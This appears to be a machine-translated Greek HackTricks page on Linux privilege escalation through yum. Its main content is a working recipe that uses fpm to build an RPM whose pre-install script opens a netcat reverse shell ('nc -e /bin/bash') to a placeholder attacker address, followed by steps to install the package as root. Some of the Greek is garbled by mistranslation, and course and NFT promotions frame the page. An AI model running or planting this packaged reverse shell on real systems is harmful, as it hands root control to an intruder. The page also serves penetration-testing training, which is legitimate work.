<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

Περαιτέρω παραδείγματα γύρω από το yum μπορούν επίσης να βρεθούν στο [gtfobins](https://gtfobins.github.io/gtfobins/yum/).

# Εκτέλεση αυθαίρετων εντολών μέσω των πακέτων RPM
## Έλεγχος του περιβάλλοντος
Προκειμένου να εκμεταλλευτείτε αυτό το διάνυσμα, ο χρήστης πρέπει να μπορεί να εκτελεί εντολές yum ως ένας χρήστης με υψηλότερα δικαιώματα, δηλαδή ως root.

### Ένα λειτουργικό παράδειγμα αυτού του διανύσματος
Ένα λειτουργικό παράδειγμα αυτής της εκμετάλλευσης μπορεί να βρεθεί στο δωμάτιο [daily bugle](https://tryhackme.com/room/dailybugle) στο [tryhackme](https://tryhackme.com).

## Συσκευασία ενός πακέτου RPM
Στην παρακάτω ενότητα, θα καλύψω τη συσκευασία ενός αντίστροφου κέλυφους σε ένα πακέτο RPM χρησιμοποιώντας το [fpm](https://github.com/jordansissel/fpm).

Το παρακάτω παράδειγμα δημιουργεί ένα πακέτο που περιλαμβάνει έναν παρακινούμενο σεναρίου πριν από την εγκατάσταση με έναν αυθαίρετο σενάριο που μπορεί να καθοριστεί από τον επιτιθέμενο. Όταν εγκαθίσταται, αυτό το πακέτο θα εκτελεί την αυθαίρετη εντολή. Έχω χρησιμοποιήσει ένα απλό παράδειγμα αντίστροφου κέλυφους με netcat για επίδειξη, αλλά αυτό μπορεί να αλλάξει όπως απαιτείται.
```text
EXPLOITDIR=$(mktemp -d)
CMD='nc -e /bin/bash <ATTACKER IP> <PORT>'
RPMNAME="exploited"
echo $CMD > $EXPLOITDIR/beforeinstall.sh
fpm -n $RPMNAME -s dir -t rpm -a all --before-install $EXPLOITDIR/beforeinstall.sh $EXPLOITDIR
```
# Παγίδευση ενός κελιού
Χρησιμοποιώντας το παραπάνω παράδειγμα και υποθέτοντας ότι το `yum` μπορεί να εκτελεστεί από έναν χρήστη με υψηλότερα δικαιώματα.

1. **Μεταφέρετε** το rpm στον κεντρικό υπολογιστή
2. **Ξεκινήστε** έναν ακροατή στον τοπικό σας υπολογιστή, όπως ο [παράδειγμα ακροατής netcat](/shells/shells/linux#netcat)
3. **Εγκαταστήστε** το ευπάθεια πακέτο `yum localinstall -y exploited-1.0-1.noarch.rpm`


<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF**, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
